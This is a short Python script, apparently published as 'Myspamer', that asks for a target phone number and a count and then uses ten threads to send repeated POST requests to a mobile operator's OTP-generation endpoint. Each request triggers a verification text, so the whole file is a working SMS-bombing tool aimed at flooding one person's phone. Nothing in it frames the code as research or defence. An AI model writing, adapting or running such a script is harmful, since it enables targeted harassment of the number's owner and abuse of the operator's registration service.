#!/usr/bin/python
# Coded by Senja
# Github: github.com/theaixtynine/Myspamer

from multiprocessing.pool import ThreadPool
try:
        import os, time, requests, sys
except ModuleNotFoundError:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mModule requests not installed")
        exit(1)

no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mInput No Target: \033[0m")
tot = int(input("\033[0m[\033[1;35m?\033[0m] \033[1;77mCount: \033[0m"))
spam = {'msisdn':no}
idk = '200'

def main(arg):
        try:
                r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
                #print(r.text)
                if str(idk) in str(r.text):
                        print("\033[0m[\033[1;36m&\033[0m] \033[1;77mSucces")
                else:
                        print(r.text)
                        print("\033[0m[\033[1;31m!\033[0m] \033[1;77mFailed")
        except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
